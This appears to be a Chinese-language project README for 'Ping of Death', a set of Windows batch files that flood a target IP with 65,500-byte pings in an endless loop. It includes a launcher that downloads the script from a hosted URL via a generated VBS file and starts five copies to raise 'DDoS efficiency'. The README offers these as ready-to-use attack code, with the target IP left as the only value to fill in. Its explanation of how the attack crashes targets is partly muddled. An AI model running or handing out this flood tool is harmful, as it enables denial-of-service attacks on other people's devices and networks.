# Ping of Death：使用bat进行DDOS  
## 介绍
“Ping of Death” 是一个通过bat批量处理文件来进行DDOS的项目，你可以用它来进行对网络摄像头等小型设备进行压力测试。
## 下载
### pingofdeath.bat
我们提供**单个执行文件**，您可以使用它在**断开互联网**的情况下使用。[点击这里下载pingofdeath.bat](https://pingofdeath.vercel.app/pingofdeath.bat)  
### startofping.bat
同时，在**联网的情况**下我们也提供更高效的启动器，集成**下载**和**运行**功能。在默认情况下，你最多可以通过它一次**启动10个**pingofdeath.bat。你可以[点击这里下载startofping.bat](https://pingofdeath.vercel.app/startofping.bat)  
## 配置
startofping.bat并不需要特别配置，您只需要配置pingofdeath.bat即可。  
这里提供源代码参考，你只需要**替换你的目标IP**即可。  

    :loop
    ping <填写你的IP> -l 65500 -w 1 -n 1
    goto :loop

****
## 解读  
### pingofdeath.bat  
ping 数据包也可以通过向目标 IP 地址发送连续的 ping 数据包来执行拒绝服务攻击。持续 ping 会导致目标系统的缓冲区溢出，并导致目标系统崩溃。   
一个 ping 数据包的大小通常为 56 字节或 84 字节（包括 IP 标头）。但是，一个 ping 数据包也可以最大为 65,536 字节。  
并非所有计算机都可以处理大于固定大小的数据。因此，当一个 ping of death 数据包从源计算机发送到目标计算机时，ping 数据包会被分割成更小的数据包组。  
一个片段大小为 8 个八位字节。当这些数据包到达目标计算机时，它们会分段到达。因此，目标计算机重新组装成块收到的格式错误的数据包。  
但是，整个组装的数据包会导致目标计算机的缓冲区溢出。  
这种缓冲流经常导致系统崩溃，使系统更容易受到攻击。  
### startofping.bat
这是pingofdeath.bat的启动器，它包括下载和运行两种功能。
下载功能很简单，[百度知道](https://zhidao.baidu.com/question/2015853793461382908.html)里面有回答。  
但是值得注意的是，如果你使用了上面的代码，我们需要稍作修改，因为这可能会遇到权限问题，具体在下面说明。  
考虑到大部分用户会把文件放在C盘（桌面），我们没有管理员权限，所以就制定了两种下载方案。
####  1.放在D盘  
考虑到不同系统对于C盘权限要求不同，我们选择把文件放在D盘。  

    ::设置文件保存目录，若下载至当前目录，请留空  
    set Save=D:\

注意，上面的代码会创建一个DownloadFile.vbs文件来下载startofping.bat。由于权限问题，我们需要指定路径。  

    ::原代码
    echo End Sub)>DownloadFile.vbs
    ::修改为
    echo End Sub)>D:\DownloadFile.vbs

最后，我们需要启动下载的文件。我们在这里重复5次来加大DDOS效率。  

    start D:\pingofdeath.bat
    start D:\pingofdeath.bat
    start D:\pingofdeath.bat
    start D:\pingofdeath.bat
    start D:\pingofdeath.bat

####  2.放在C盘
考虑到极个别电脑只有C盘一个盘符（虽然这种可能性极小），我们还是准备了C盘方案。经检验，Windows11系统的C:\Users\Public\是可以无权限使用的。所以同理：  


    ::设置文件保存目录，若下载至当前目录，请留空
    set Save=C:\Users\Public\

更改DownloadFile.vbs文件指定路径。  

    ::原代码
    echo End Sub)>DownloadFile.vbs
    ::修改为
    echo End Sub)>C:\Users\Public\DownloadFile.vbs

最后，我们启动下载的文件。  

    start C:\Users\Public\pingofdeath.bat
    start C:\Users\Public\pingofdeath.bat
    start C:\Users\Public\pingofdeath.bat
    start C:\Users\Public\pingofdeath.bat
    start C:\Users\Public\pingofdeath.bat

至此，代码就解读完成了。 
**** 
## 存放服务器
由于GitHubPage好像禁止了直接通过http下载文件，我们就使用了vercle服务，文件直接从vercel服务器获取pingofdeath.bat。  
****
作者的[博客](https://gloridust.tk)